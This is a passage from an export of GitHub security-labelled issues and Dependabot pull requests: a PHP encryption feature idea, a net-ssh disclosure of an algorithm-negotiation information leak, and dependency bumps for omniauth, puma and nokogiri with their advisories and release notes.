A common approach is to go with the blowfish cbc encryption algorithm wherein the person installing the application decides the single key for the entirety of encrypted data for all users, saves it in the config file or elsewhere, then that key is used for all encryption/decryption.  As the encrypted data is in binary then a final step is usually used of base64 encoding to make it ascii before storing the encoded data anywhere.

This encryption is handled PHP's mcrypt library which connects to an underlaying C library - neither may be installed so this would probably have to be an optional feature.

examples:
http://www.php.net/manual/en/function.mcrypt-encrypt.php#44728
http://www.chilkatsoft.com/p/php_blowfish.asp
",no,"security,"
net-ssh/net-ssh,937912475,"Security Issue - Observable Discrepancy leading to an information leak in the algorithm negotiation","net-ssh has an Observable Discrepancy leading to an information leak in the algorithm negotiation. This allows man-in-the-middle attackers to target initial connection attempts (where no host key for the server has been cached by the client). 

This vulnerability allows a man in the middle attack to determine, if a client already has prior knowledge of the remote hosts fingerprint.

Using this information leak it is possible to ignore clients, which will show an error message during an man in the middle attack, while new clients can be intercepted without alerting them of the man in the middle attack.

This is the same vulnerability like in [OpenSSH](https://docs.ssh-mitm.at/CVE-2020-14145.html) and [PuTTY](https://docs.ssh-mitm.at/CVE-2020-14002.html).

Example known host fingerprint:

```
['ssh-rsa', 'ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519', 'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com', 'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp521', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp256', 'ssh-rsa-cert-v01@openssh.com', 'ssh-rsa-cert-v00@openssh.com', 'ssh-dss']
```

Without known fingerprint:

```
['ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519', 'ecdsa-sha2-nistp521-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com', 'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp521', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp256', 'ssh-rsa-cert-v01@openssh.com', 'ssh-rsa-cert-v00@openssh.com', 'ssh-rsa', 'ssh-dss']
```
",,no,"security,"
thoughtbot/upcase,853411824,"[Security] Bump omniauth from 1.9.1 to 2.0.4","Bumps [omniauth](https://github.com/omniauth/omniauth) from 1.9.1 to 2.0.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth/CVE-2015-9284.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>CSRF vulnerability in OmniAuth's request phase</strong>
The request phase of the OmniAuth Ruby gem is vulnerable to Cross-Site
Request Forgery (CSRF) when used as part of the Ruby on Rails framework, allowing
accounts to be connected without user intent, user interaction, or feedback to
the user. This permits a secondary account to be able to sign into the web
application as the primary account.</p>
<p>In order to mitigate this vulnerability, Rails users should consider using the
<code>omniauth-rails_csrf_protection</code> gem.</p>
<p>More info is available here: <a href=""https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284"">https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284</a></p>
<p>Patched versions: &gt;= 2.0.0
Unaffected versions: none</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/omniauth/omniauth/releases"">omniauth's releases</a>.</em></p>
<blockquote>
<h2>v2.0.4</h2>
<p>This release removes unnecessary warning logging when accessing GET routes that are not related to the OmniAuth request path.</p>
<p>Thanks to <a href=""https://github.com/charlie-wasp""><code>@charlie-wasp</code></a> and <a href=""https://github.com/sponomarev""><code>@sponomarev</code></a> at <a href=""https://github.com/evilmartians"">Evil Martians</a> for the bug find and subsequent PR.</p>
<h2>Fix rescuing of application errors when call_app! is used.</h2>
<p>As a consequence of the changes that were merged in <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/689"">#689</a>, errors
thrown by strategies that utilize other_phase (or more specifically
call_app!), would be caught by omniauth, causing headaches for folks
looking to have those errors handled by their application. This
should allow for errors that come from the app to pass through, while
passing errors that come from the authentication phases to the fail!
handler.</p>
<p>Resolves <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1030"">#1030</a></p>
<h2>Fix for incorrect order of request_validation_phase in test_mode.</h2>
<p><a href=""https://github.com/jsdalton""><code>@jsdalton</code></a> gave an awesome report of the issue present in test_mode in <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1033"">#1033</a></p>
<blockquote>
<p>The current implementation of mock_call was verifying the token for all requests, regardless of whether the current path is on the omniauth request path. The change was introduced recently in 1b784ff. See <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1032"">#1032</a> for details.</p>
<p>This creates two problems:</p>
<ol>
<li>When test mode is on, the authenticity verification logic is run inappropriately against requests where this may not even be wanted.</li>
<li>The behavior varies from actual production behavior, potentially allowing bugs to be introduced by unwary developers.</li>
</ol>
</blockquote>
<p>Note that this bug was only present when OmniAuth was configured for test_mode and using the mock_call phases.</p>
<h2>Allow passing rack-protection configuration to default request_validation_phase</h2>
<p>This release now properly allows an instance of OmniAuth::AuthenticityTokenProtection (with passed in rack-protection configuration) to be used as the request_validation_phase.</p>
<p>Thanks <a href=""https://github.com/jkowens""><code>@jkowens</code></a> <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/pull/1027"">#1027</a></p>
<p>If you haven't already read the <a href=""https://github.com/omniauth/omniauth/releases/tag/v2.0.0"">release notes</a> for v2.0.0, you should do so.</p>
<h2>v2.0.0</h2>
<p>Version 2.0 of OmniAuth includes some changes that may be breaking depending on how you use OmniAuth in your app.</p>
<p>Many thanks to the folks who contributed in code and discussion for these changes.</p>
<h2><strong>OmniAuth now defaults to only POST as the allowed request_phase method.</strong></h2>
<p>Hopefully, you were already doing this as a result of the warnings due to <a href=""https://nvd.nist.gov/vuln/detail/CVE-2015-9284"">CVE-2015-9284</a>.<br />
For detailed context, see:<br />
<a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/960"">#960</a><br />
<a href=""https://github-redirect.dependabot.com/omniauth/omniauth/pull/809"">#809</a><br />
<a href=""https://github.com/omniauth/omniauth/wiki/Resolving-CVE-2015-9284"">Resolving CVE-2015-9284</a></p>
<p>This change also includes an additional configurable phase: <code>request_validation_phase</code>.</p>
<h3>Rack/Sinatra</h3>
<p>By default, this uses rack-protection's <a href=""https://github.com/sinatra/sinatra/tree/master/rack-protection"">AuthenticityToken</a> class to validate authenticity tokens. If you are using a rack based framework like sinatra, you can find an example of how to add authenticity tokens to your view <a href=""https://github.com/BobbyMcWho/omniauth_2_examples/blob/main/sinatra_app.ru#L18-L21"">here</a>.</p>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/omniauth/omniauth/commit/e7b8811e5bde85cf193192cd4b90e8cefd821f9f""><code>e7b8811</code></a> Release v2.0.4</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/119a54d7fb3808276adcdc735bf04f7d5dbc1951""><code>119a54d</code></a> Remove jruby-head for now</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/f0e5d42290c6e9f2dbdeb7a8036e96c2f16d2990""><code>f0e5d42</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1041"">#1041</a> from charlie-wasp/fix/get-request-warning</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/b72a8db667960ae1a930d0df4f5e5917dcd0ad7a""><code>b72a8db</code></a> Warn only on GET requests for login path</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/481e30734762dbd7ac0d54593b0bc34982cb2ae1""><code>481e307</code></a> Prepare for next development iteration</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/f9dddef38831440b49d3d38a0e6b1e87cc4dca2b""><code>f9dddef</code></a> v2.0.3 release</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/7e1b49fc665827dcbc8fde12aa624357968a4f6a""><code>7e1b49f</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/omniauth/omniauth/issues/1035"">#1035</a> from omniauth/1030-standard-error-handling</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/6f4cdb08f4741a0b3c83dfafd5f93e972be97c0e""><code>6f4cdb0</code></a> Better handle errors that come from the actual app.</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/0d533c3615f7c54fa2b64d160fe7943c6fc52f78""><code>0d533c3</code></a> Update README for next dev cycle.</li>
<li><a href=""https://github.com/omniauth/omniauth/commit/ba115e1ac2c0364a8377c64946571c97f4b31cca""><code>ba115e1</code></a> Prepare for 2.0.2 release</li>
<li>Additional commits viewable in <a href=""https://github.com/omniauth/omniauth/compare/v1.9.1...v2.0.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=omniauth&package-manager=bundler&previous-version=1.9.1&new-version=2.0.4)](https://dependabot.com/compatibility-score/?dependency-name=omniauth&package-manager=bundler&previous-version=1.9.1&new-version=2.0.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,893856922,"[Security] Bump puma from 5.1.1 to 5.3.1","Bumps [puma](https://github.com/puma/puma) from 5.1.1 to 5.3.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-q28m-8xjw-8vr5"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Keepalive Connections Causing Denial Of Service in puma</strong>
This vulnerability is related to <a href=""https://github.com/puma/puma/security/advisories/GHSA-7xx3-m584-x994"">CVE-2019-16770</a>.</p>
<h3>Impact</h3>
<p>The fix for CVE-2019-16770 was incomplete. The original fix only protected existing connections that had already been accepted from having their requests starved by greedy persistent-connections saturating all threads in the same process. However, new connections may still be starved by greedy persistent-connections saturating all threads in all processes in the cluster.</p>
<p>A <code>puma</code> server which received more concurrent <code>keep-alive</code> connections than the server had threads in its threadpool would service only a subset of connections, denying service to the unserved connections.</p>
<h3>Patches</h3>
<p>This problem has been fixed in <code>puma</code> 4.3.8 and 5.3.1.</p>
<h3>Workarounds</h3>
<p>Setting <code>queue_requests false</code> also fixes the issue. This is not advised when using <code>puma</code> without a reverse proxy, such as <code>nginx</code> or <code>apache</code>, because you will open yourself to slow client attacks (e.g. <a href=""https://en.wikipedia.org/wiki/Slowloris_(computer_security)"">slowloris</a>).</p>
<p>The fix is very small. <a href=""https://gist.github.com/nateberkopec/4b3ea5676c0d70cbb37c82d54be25837"">A git patch is available here</a> for those using <a href=""https://github.com/puma/puma/security/policy#supported-versions"">unsupported versions</a> of Puma.</p>
<h3>For more information</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt;= 5.0.0, &lt;= 5.3.0</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/puma/puma/releases"">puma's releases</a>.</em></p>
<blockquote>
<h2>5.3.1</h2>
<ul>
<li>Security
<ul>
<li>Close keepalive connections after the maximum number of fast inlined requests (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2625"">#2625</a>)</li>
</ul>
</li>
</ul>
<h2>5.3.0 - Sweetnighter</h2>
<h2>5.3.0 / 2021-05-07</h2>
<p><img src=""https://upload.wikimedia.org/wikipedia/en/3/36/WRsweetnighter.jpg"" alt="""" /></p>
<p>Contributor <a href=""https://github.com/MSP-Greg""><code>@​MSP-Greg</code></a> codenamed this release &quot;Sweetnighter&quot;.</p>
<ul>
<li>
<p>Features</p>
<ul>
<li>Add support for Linux's abstract sockets (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2564"">#2564</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2526"">#2526</a>)</li>
<li>Add debug to worker timeout and startup (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2559"">#2559</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2528"">#2528</a>)</li>
<li>Print warning when running one-worker cluster (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2565"">#2565</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2534"">#2534</a>)</li>
<li>Don't close systemd activated socket on pumactl restart (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2563"">#2563</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2504"">#2504</a>)</li>
</ul>
</li>
<li>
<p>Bugfixes</p>
<ul>
<li>systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2572"">#2572</a>)</li>
<li>Immediately unlink temporary files (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2613"">#2613</a>)</li>
<li>Improve parsing of HTTP_HOST header (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2605"">#2605</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2584"">#2584</a>)</li>
<li>Handle fatal error that has no backtrace (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2607"">#2607</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2552"">#2552</a>)</li>
<li>Fix timing out requests too early (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2606"">#2606</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2574"">#2574</a>)</li>
<li>Handle segfault in Ruby 2.6.6 on thread-locals (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2567"">#2567</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2566"">#2566</a>)</li>
<li>Server#closed_socket? - parameter may be a MiniSSL::Socket (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2596"">#2596</a>)</li>
<li>Define UNPACK_TCP_STATE_FROM_TCP_INFO in the right place (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2588"">#2588</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2556"">#2556</a>)</li>
<li>request.rb - fix chunked assembly for ascii incompatible encodings, add test (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2585"">#2585</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2583"">#2583</a>)</li>
</ul>
</li>
<li>
<p>Performance</p>
<ul>
<li>Reset peerip only if remote_addr_header is set (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2609"">#2609</a>)</li>
<li>Reduce puma_parser struct size (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2590"">#2590</a>)</li>
</ul>
</li>
<li>
<p>Refactor</p>
<ul>
<li>Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li>Micro optimisations in <code>wait_for_less_busy_worker</code> feature (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2579"">#2579</a>)</li>
<li>Lots of test fixes</li>
</ul>
</li>
</ul>
<h2>5.2.2</h2>
<ul>
<li>Bugfixes
<ul>
<li>Add <code>#flush</code> and <code>#sync</code> methods to <code>Puma::NullIO</code>  (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2553"">#2553</a>)</li>
<li>Restore <code>sync=true</code> on <code>STDOUT</code> and <code>STDERR</code> streams (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2557"">#2557</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.1</h2>
<h2>2021-02-05</h2>
<ul>
<li>Bugfixes
<ul>
<li>Fix TCP cork/uncork operations to work with ssl clients (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2550"">#2550</a>)</li>
<li>Require rack/common_logger explicitly if :verbose is true (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2547"">#2547</a>)</li>
<li>MiniSSL::Socket#write - use data.byteslice(wrote..-1) (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2543"">#2543</a>)</li>
<li>Set <code>@env[CONTENT_LENGTH]</code> value as string. (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2549"">#2549</a>)</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/puma/puma/blob/master/History.md"">puma's changelog</a>.</em></p>
<blockquote>
<h2>5.3.1 / 2021-05-11</h2>
<ul>
<li>Security
<ul>
<li>Close keepalive connections after the maximum number of fast inlined requests (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2625"">#2625</a>)</li>
</ul>
</li>
</ul>
<h2>5.3.0 / 2021-05-07</h2>
<ul>
<li>
<p>Features</p>
<ul>
<li>Add support for Linux's abstract sockets (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2564"">#2564</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2526"">#2526</a>)</li>
<li>Add debug to worker timeout and startup (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2559"">#2559</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2528"">#2528</a>)</li>
<li>Print warning when running one-worker cluster (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2565"">#2565</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2534"">#2534</a>)</li>
<li>Don't close systemd activated socket on pumactl restart (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2563"">#2563</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2504"">#2504</a>)</li>
</ul>
</li>
<li>
<p>Bugfixes</p>
<ul>
<li>systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2572"">#2572</a>)</li>
<li>Immediately unlink temporary files (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2613"">#2613</a>)</li>
<li>Improve parsing of HTTP_HOST header (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2605"">#2605</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2584"">#2584</a>)</li>
<li>Handle fatal error that has no backtrace (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2607"">#2607</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2552"">#2552</a>)</li>
<li>Fix timing out requests too early (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2606"">#2606</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2574"">#2574</a>)</li>
<li>Handle segfault in Ruby 2.6.6 on thread-locals (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2567"">#2567</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2566"">#2566</a>)</li>
<li>Server#closed_socket? - parameter may be a MiniSSL::Socket (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2596"">#2596</a>)</li>
<li>Define UNPACK_TCP_STATE_FROM_TCP_INFO in the right place (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2588"">#2588</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2556"">#2556</a>)</li>
<li>request.rb - fix chunked assembly for ascii incompatible encodings, add test (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2585"">#2585</a>, <a href=""https://github-redirect.dependabot.com/puma/puma/issues/2583"">#2583</a>)</li>
</ul>
</li>
<li>
<p>Performance</p>
<ul>
<li>Reset peerip only if remote_addr_header is set (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2609"">#2609</a>)</li>
<li>Reduce puma_parser struct size (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2590"">#2590</a>)</li>
</ul>
</li>
<li>
<p>Refactor</p>
<ul>
<li>Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li>Micro optimisations in <code>wait_for_less_busy_worker</code> feature (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2579"">#2579</a>)</li>
<li>Lots of test fixes</li>
</ul>
</li>
</ul>
<h2>5.2.2 / 2021-02-22</h2>
<ul>
<li>Bugfixes
<ul>
<li>Add <code>#flush</code> and <code>#sync</code> methods to <code>Puma::NullIO</code>  (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2553"">#2553</a>)</li>
<li>Restore <code>sync=true</code> on <code>STDOUT</code> and <code>STDERR</code> streams (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2557"">#2557</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.1 / 2021-02-05</h2>
<ul>
<li>Bugfixes
<ul>
<li>Fix TCP cork/uncork operations to work with ssl clients (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2550"">#2550</a>)</li>
<li>Require rack/common_logger explicitly if :verbose is true (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2547"">#2547</a>)</li>
<li>MiniSSL::Socket#write - use data.byteslice(wrote..-1) (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2543"">#2543</a>)</li>
<li>Set <code>@env[CONTENT_LENGTH]</code> value as string. (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2549"">#2549</a>)</li>
</ul>
</li>
</ul>
<h2>5.2.0 / 2021-01-27</h2>
<ul>
<li>Features</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/puma/puma/commit/1c91a4f1af23328118dbfe5b615f812af5e817ef""><code>1c91a4f</code></a> 5.3.1</li>
<li><a href=""https://github.com/puma/puma/commit/6b4a68ab9b4604e44471201d688a5ee876b1bb8a""><code>6b4a68a</code></a> 4.3.8 release note</li>
<li><a href=""https://github.com/puma/puma/commit/df72887170c7ef3614c941c9bdefb4a1f3546ebf""><code>df72887</code></a> Close keepalive connections after MAX_FAST_INLINE requests</li>
<li><a href=""https://github.com/puma/puma/commit/6dfb8bc2ba1175198f5982cc8092bcb7f021fe22""><code>6dfb8bc</code></a> 5.3.0 history (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2622"">#2622</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/fb713236a14b8bd338b690b3cb42afb4eee5f20e""><code>fb71323</code></a> Ignore DS_Store</li>
<li><a href=""https://github.com/puma/puma/commit/f7a2d4eedc6c3ac8069b05a5ce48fcf11bc525ef""><code>f7a2d4e</code></a> systemd - fix event firing (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2591"">#2591</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/2654f02accb8ffb8a722f480c898715aa8d0b16d""><code>2654f02</code></a> Bump version to 5.3.0 [ci skip] (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2616"">#2616</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/cc1768e122d1583c884bc0cf9b8699aa7393bbac""><code>cc1768e</code></a> Few documentations fixes. [ci skip] [changelog skip] (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2619"">#2619</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/ff17194228315fac74e0c9595c4bb89b38aad3f2""><code>ff17194</code></a> Refactor drain on shutdown (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2600"">#2600</a>)</li>
<li><a href=""https://github.com/puma/puma/commit/3e80f7c704e5585da4faa32edf0fa7a0abed3689""><code>3e80f7c</code></a> fix some spell errors (<a href=""https://github-redirect.dependabot.com/puma/puma/issues/2615"">#2615</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/puma/puma/compare/v5.1.1...v5.3.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=puma&package-manager=bundler&previous-version=5.1.1&new-version=5.3.1)](https://dependabot.com/compatibility-score/?dependency-name=puma&package-manager=bundler&previous-version=5.1.1&new-version=5.3.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
thoughtbot/upcase,893728143,"[Security] Bump nokogiri from 1.10.10 to 1.11.4","Bumps [nokogiri](https://github.com/sparklemotion/nokogiri) from 1.10.10 to 1.11.4. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-vr8q-g5c7-m54m"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>XXE in Nokogiri</strong></p>
<h3>Severity</h3>
<p>Nokogiri maintainers have evaluated this as <a href=""https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N""><strong>Low Severity</strong> (CVSS3 2.6)</a>.</p>
<h3>Description</h3>
<p>In Nokogiri versions &lt;= 1.11.0.rc3, XML Schemas parsed by <code>Nokogiri::XML::Schema</code> are <strong>trusted</strong> by default, allowing external resources to be accessed over the network, potentially enabling XXE or SSRF attacks.</p>
<p>This behavior is counter to the security policy followed by Nokogiri maintainers, which is to treat all input as <strong>untrusted</strong> by default whenever possible.</p>
<p>Please note that this security fix was pushed into a new minor version, 1.11.x, rather than a patch release to the 1.10.x branch, because it is a breaking change for some schemas and the risk was assessed to be &quot;Low Severity&quot;.</p>
<h3>Affected Versions</h3>
<p>Nokogiri <code>&amp;lt;= 1.10.10</code> as well as prereleases <code>1.11.0.rc1</code>, <code>1.11.0.rc2</code>, and <code>1.11.0.rc3</code></p>
<h3>Mitigation</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt;= 1.10.10</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/CVE-2020-26247.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Nokogiri::XML::Schema trusts input by default, exposing risk of an XXE vulnerability</strong></p>
<h3>Description</h3>
<p>In Nokogiri versions &lt;= 1.11.0.rc3, XML Schemas parsed by <code>Nokogiri::XML::Schema</code>
are <strong>trusted</strong> by default, allowing external resources to be accessed over the
network, potentially enabling XXE or SSRF attacks.</p>
<p>This behavior is counter to
the security policy followed by Nokogiri maintainers, which is to treat all input
as <strong>untrusted</strong> by default whenever possible.</p>
<p>Please note that this security
fix was pushed into a new minor version, 1.11.x, rather than a patch release to
the 1.10.x branch, because it is a breaking change for some schemas and the risk
was assessed to be &quot;Low Severity&quot;.</p>
<h3>Affected Versions</h3>
